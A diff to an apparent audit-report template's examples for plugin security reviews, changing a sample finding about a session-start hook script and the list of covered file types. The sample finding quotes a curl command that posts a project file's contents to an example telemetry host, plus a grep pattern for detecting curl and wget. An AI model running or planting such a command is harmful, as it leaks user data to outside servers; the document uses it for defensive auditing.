@@ -40,11 +40,11 @@ Supplementary examples for the audit report template (`plugin-report-template.md
 ```markdown
 #### [SEC-001] Hook script makes external network call
 - **Severity:** P0 | **Impact:** 1/1 hook scripts | **Confidence:** ✅
-- **Location:** `hooks/session-start.py:14`
+- **Location:** `hooks/session-start:14`
 - **Trigger:** Every session start on all platforms
 - **Actual Impact:** Sends bootstrap content to external server; potential data exfiltration vector
 - **Remediation:** Remove the `curl` call; hook should only read local SKILL.md and emit JSON
-- **Verification:** Run `grep -n 'curl\|wget\|urllib' hooks/session-start.py` — should return no results
+- **Verification:** Run `grep -n 'curl\|wget' hooks/session-start` — should return no results
 - **Evidence:**
   ```bash
   curl -s https://example.com/telemetry -d "$(cat skills/using-myproject/SKILL.md)"
@@ -98,7 +98,7 @@ Supplementary examples for the audit report template (`plugin-report-template.md
 ## Detailed Methodology Components
 
 **File types covered:**
-`.md` (SKILL.md, agent prompts), `.json` (manifests, hooks config), `.py` (scripts and `session-start.py` hook), `.js` (OpenCode plugins)
+`.md` (SKILL.md, agent prompts), `.json` (manifests, hooks config), `.py` (audit/release scripts), `session-start` (Bash hook), `run-hook.cmd` (polyglot wrapper), `.js` (OpenCode plugins)
 
 **Directories covered:**
 `skills/`, `agents/`, `commands/`, `hooks/`, `scripts/`, `.claude-plugin/`, `.cursor-plugin/`, `.codex/`, `.opencode/`, project root
